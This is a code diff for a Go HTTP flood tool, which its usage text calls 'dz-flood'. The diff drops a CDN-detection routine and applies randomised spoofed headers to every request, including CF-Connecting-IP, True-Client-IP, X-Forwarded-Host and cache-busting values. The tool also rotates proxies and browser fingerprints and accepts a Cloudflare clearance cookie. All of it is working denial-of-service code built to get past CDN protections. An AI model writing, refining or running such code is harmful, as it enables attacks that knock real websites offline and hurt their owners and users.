@@ -39,6 +39,7 @@ type BrowserProfile struct {
 	SecChUaPlat string
 }
 
+// Hanya 4 browser paling populer
 var profiles = []BrowserProfile{
 	{
 		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
@@ -98,8 +99,6 @@ type Capabilities struct {
 	IfRange bool
 }
 
-var cdnType string
-
 func init() {
 	runtime.GOMAXPROCS(runtime.NumCPU())
 }
@@ -119,42 +118,6 @@ func RST(rng *rand.Rand, length int) string {
 
 var customCookie string
 var ifModifiedSince = time.Now().AddDate(-1, 0, 0).Format(time.RFC1123)
-
-func DetectCDN(target string) string {
-	client := &http.Client{
-		Timeout: 5 * time.Second,
-		CheckRedirect: func(req *http.Request, via []*http.Request) error {
-			return http.ErrUseLastResponse
-		},
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		},
-	}
-	req, err := http.NewRequest("HEAD", target, nil)
-	if err != nil {
-		return "generic"
-	}
-	req.Header.Set("User-Agent", "Mozilla/5.0")
-	resp, err := client.Do(req)
-	if err != nil {
-		return "generic"
-	}
-	defer resp.Body.Close()
-
-	if resp.Header.Get("CF-Ray") != "" || resp.Header.Get("cf-request-id") != "" {
-		return "cloudflare"
-	}
-	if resp.Header.Get("X-Akamai-Transformed") != "" || strings.Contains(resp.Header.Get("Server"), "Akamai") {
-		return "akamai"
-	}
-	if resp.Header.Get("X-Amz-Cf-Id") != "" || strings.Contains(resp.Header.Get("Server"), "Amazon") {
-		return "aws"
-	}
-	if resp.Header.Get("X-Fastly-Request-ID") != "" {
-		return "fastly"
-	}
-	return "generic"
-}
 
 func Detect_Pyload(target string) int {
 	client := &http.Client{
@@ -374,7 +337,6 @@ func Detect_Max_Total_Header_Size(target string) int {
 
 func main() {
 	log.SetOutput(io.Discard)
-
 	if len(os.Args) < 2 {
 		fmt.Println("Cara pakai: dz-flood <target> [duration] [cookie]")
 		fmt.Println("Contoh: dz-flood https://target.com 60 \"cf_clearance=xxx\"")
@@ -393,9 +355,6 @@ func main() {
 
 	parsed, _ := url.Parse(tgt)
 	host := parsed.Hostname()
-
-	cdnType = DetectCDN(tgt)
-	fmt.Printf("[INFO] Detected CDN: %s\n", cdnType)
 
 	var proxies []*url.URL
 	file, err := os.Open("proxy.txt")
@@ -552,69 +511,66 @@ func main() {
 						headerMap["If-Modified-Since"] = ifModifiedSince
 						headerMap["X-Cache-Buster"] = strconv.FormatInt(subRng.Int63(), 16)
 
-						if cdnType == "cloudflare" {
-							if caps.Headers["X-Original-URL"] && subRng.Intn(3) == 0 {
-								headerMap["X-Original-URL"] = "/" + strconv.FormatInt(subRng.Int63(), 16)
+						if caps.Headers["X-Original-URL"] && subRng.Intn(3) == 0 {
+							headerMap["X-Original-URL"] = "/" + strconv.FormatInt(subRng.Int63(), 16)
+						}
+						if caps.Headers["X-Forwarded-Host"] && subRng.Intn(3) == 0 {
+							headerMap["X-Forwarded-Host"] = strconv.FormatInt(subRng.Int63(), 16) + ".example.com"
+						}
+						if caps.Headers["X-Request-ID"] && subRng.Intn(3) == 0 {
+							headerMap["X-Request-ID"] = strconv.FormatInt(subRng.Int63(), 16)
+						}
+						if caps.Headers["CF-Connecting-IP"] && subRng.Intn(5) == 0 {
+							headerMap["CF-Connecting-IP"] = cli.ip
+						}
+						if caps.Headers["True-Client-IP"] && subRng.Intn(5) == 0 {
+							headerMap["True-Client-IP"] = cli.ip
+						}
+						if caps.Headers["CDN-Loop"] && subRng.Intn(5) == 0 {
+							headerMap["CDN-Loop"] = "cloudflare"
+						}
+
+						for h, supported := range caps.Headers {
+							if !supported {
+								continue
 							}
-							if caps.Headers["X-Forwarded-Host"] && subRng.Intn(3) == 0 {
-								headerMap["X-Forwarded-Host"] = strconv.FormatInt(subRng.Int63(), 16) + ".example.com"
+							if subRng.Intn(3) != 0 {
+								continue
 							}
-							if caps.Headers["X-Request-ID"] && subRng.Intn(3) == 0 {
-								headerMap["X-Request-ID"] = strconv.FormatInt(subRng.Int63(), 16)
-							}
-							if caps.Headers["CF-Connecting-IP"] && subRng.Intn(5) == 0 {
-								headerMap["CF-Connecting-IP"] = cli.ip
-							}
-							if caps.Headers["True-Client-IP"] && subRng.Intn(5) == 0 {
-								headerMap["True-Client-IP"] = cli.ip
-							}
-							if caps.Headers["CDN-Loop"] && subRng.Intn(5) == 0 {
-								headerMap["CDN-Loop"] = "cloudflare"
-							}
-							for h, supported := range caps.Headers {
-								if !supported {
-									continue
-								}
-								if subRng.Intn(3) != 0 {
-									continue
-								}
-								switch h {
-								case "X-Original-URL", "X-Forwarded-Host", "X-Request-ID", "CDN-Loop", "CF-Connecting-IP", "True-Client-IP":
-									continue
-								case "X-Client-IP", "X-Remote-IP", "X-Originating-IP":
-									headerMap[h] = cli.ip
-								case "X-Forwarded-Proto":
-									headerMap[h] = []string{"http", "https"}[subRng.Intn(2)]
-								case "X-Forwarded-Port":
-									headerMap[h] = strconv.Itoa(80 + subRng.Intn(100))
-								case "X-Forwarded-Scheme":
-									headerMap[h] = []string{"http", "https"}[subRng.Intn(2)]
-								case "X-Requested-With":
-									headerMap[h] = "XMLHttpRequest"
-								case "Accept-Charset":
-									headerMap[h] = "utf-8, iso-8859-1;q=0.5"
-								case "Accept-Datetime":
-									headerMap[h] = time.Now().Add(-time.Duration(subRng.Intn(3600)) * time.Second).Format(time.RFC1123)
-								case "From":
-									headerMap[h] = RST(subRng, 8) + "@example.com"
-								case "Max-Forwards":
-									headerMap[h] = strconv.Itoa(1 + subRng.Intn(10))
-								case "Via":
-									headerMap[h] = fmt.Sprintf("1.1 proxy-%d.example.com", subRng.Intn(100))
-								case "Warning":
-									headerMap[h] = fmt.Sprintf("%d %s", 100+subRng.Intn(20), RST(subRng, 10))
-								case "DNT":
-									headerMap[h] = "1"
-								case "Upgrade":
-									headerMap[h] = "websocket"
-								case "Save-Data":
-									headerMap[h] = "on"
-								case "X-HTTP-Method-Override":
-									headerMap[h] = []string{"PUT", "DELETE", "PATCH"}[subRng.Intn(3)]
-								case "X-Cache":
-									headerMap[h] = []string{"MISS", "HIT", "EXPIRED"}[subRng.Intn(3)]
-								default:
-								}
+							switch h {
+							case "X-Original-URL", "X-Forwarded-Host", "X-Request-ID", "CDN-Loop", "CF-Connecting-IP", "True-Client-IP":
+							case "X-Client-IP", "X-Remote-IP", "X-Originating-IP":
+								headerMap[h] = cli.ip
+							case "X-Forwarded-Proto":
+								headerMap[h] = []string{"http", "https"}[subRng.Intn(2)]
+							case "X-Forwarded-Port":
+								headerMap[h] = strconv.Itoa(80 + subRng.Intn(100))
+							case "X-Forwarded-Scheme":
+								headerMap[h] = []string{"http", "https"}[subRng.Intn(2)]
+							case "X-Requested-With":
+								headerMap[h] = "XMLHttpRequest"
+							case "Accept-Charset":
+								headerMap[h] = "utf-8, iso-8859-1;q=0.5"
+							case "Accept-Datetime":
+								headerMap[h] = time.Now().Add(-time.Duration(subRng.Intn(3600)) * time.Second).Format(time.RFC1123)
+							case "From":
+								headerMap[h] = RST(subRng, 8) + "@example.com"
+							case "Max-Forwards":
+								headerMap[h] = strconv.Itoa(1 + subRng.Intn(10))
+							case "Via":
+								headerMap[h] = fmt.Sprintf("1.1 proxy-%d.example.com", subRng.Intn(100))
+							case "Warning":
+								headerMap[h] = fmt.Sprintf("%d %s", 100+subRng.Intn(20), RST(subRng, 10))
+							case "DNT":
+								headerMap[h] = "1"
+							case "Upgrade":
+								headerMap[h] = "websocket"
+							case "Save-Data":
+								headerMap[h] = "on"
+							case "X-HTTP-Method-Override":
+								headerMap[h] = []string{"PUT", "DELETE", "PATCH"}[subRng.Intn(3)]
+							case "X-Cache":
+								headerMap[h] = []string{"MISS", "HIT", "EXPIRED"}[subRng.Intn(3)]
 							}
 						}
 
